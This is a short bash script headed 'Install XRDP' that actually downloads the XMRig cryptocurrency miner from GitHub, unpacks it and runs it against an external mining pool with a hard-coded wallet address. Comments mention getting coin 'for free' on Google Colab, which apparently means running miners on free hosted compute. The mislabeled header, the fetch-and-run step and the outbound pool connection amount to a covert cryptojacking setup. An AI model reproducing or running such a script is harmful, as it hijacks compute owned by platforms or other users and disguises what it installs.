#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --donate-level 0 -a gr -o pool.minafacil.com:4001 --tls -u RWSuJqfFqMWdfPwnbLA7iLza3tAdDcc6g3.M18 -p x
